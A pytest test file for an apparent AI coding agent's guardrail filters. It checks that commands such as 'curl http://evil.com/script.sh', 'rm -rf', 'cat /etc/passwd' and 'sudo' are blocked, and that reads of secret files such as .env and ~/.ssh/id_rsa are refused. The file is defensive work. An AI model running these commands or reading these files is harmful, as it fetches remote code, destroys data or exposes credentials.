"""Tests for guardrail filters."""

import pytest

from codepilot.guardrails.command_filter import CommandFilter, GuardrailViolation
from codepilot.guardrails.file_filter import FileFilter


class TestCommandFilter:
    """Test the command filter guardrail."""

    @pytest.fixture
    def cmd_filter(self):
        return CommandFilter()

    def test_blocked_rm_rf(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("rm -rf /tmp/important", "/sandbox/42")

    def test_blocked_curl(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("curl http://evil.com/script.sh", "/sandbox/42")

    def test_blocked_pip_install(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("pip install malicious-package", "/sandbox/42")

    def test_blocked_system_path(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("cat /etc/passwd", "/sandbox/42")

    def test_blocked_windows_path(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("dir C:\\Windows\\System32", "/sandbox/42")

    def test_allowed_pytest(self, cmd_filter):
        cmd_filter.check("pytest", "/sandbox/42")

    def test_allowed_python_script(self, cmd_filter):
        cmd_filter.check("python script.py", "/sandbox/42")

    def test_allowed_echo(self, cmd_filter):
        cmd_filter.check("echo hello", "/sandbox/42")

    def test_blocked_sudo(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("sudo rm file.txt", "/sandbox/42")

    def test_blocked_git_push_force(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("git push --force origin main", "/sandbox/42")

    def test_blocked_shutdown(self, cmd_filter):
        with pytest.raises(GuardrailViolation):
            cmd_filter.check("shutdown now", "/sandbox/42")


class TestFileFilter:
    """Test the file filter guardrail."""

    @pytest.fixture
    def file_filter(self):
        return FileFilter()

    def test_blocked_env(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check(".env")

    def test_blocked_secret(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check("config.secret")

    def test_blocked_pem_key(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check("keys/server.pem")

    def test_blocked_credentials(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check("aws_credentials.json")

    def test_blocked_ssh_key(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check("~/.ssh/id_rsa")

    def test_allowed_python_file(self, file_filter):
        file_filter.check("src/main.py")

    def test_allowed_json_config(self, file_filter):
        file_filter.check("config.json")

    def test_allowed_markdown(self, file_filter):
        file_filter.check("README.md")

    def test_blocked_id_ed25519(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check("id_ed25519")

    def test_blocked_git_config(self, file_filter):
        with pytest.raises(GuardrailViolation):
            file_filter.check(".git/config")


class TestGuardrailViolation:
    """Test the GuardrailViolation exception."""

    def test_exception_fields(self):
        e = GuardrailViolation(rule="test_rule", detail="blocked for testing")
        assert e.rule == "test_rule"
        assert e.detail == "blocked for testing"
        assert "test_rule" in str(e)
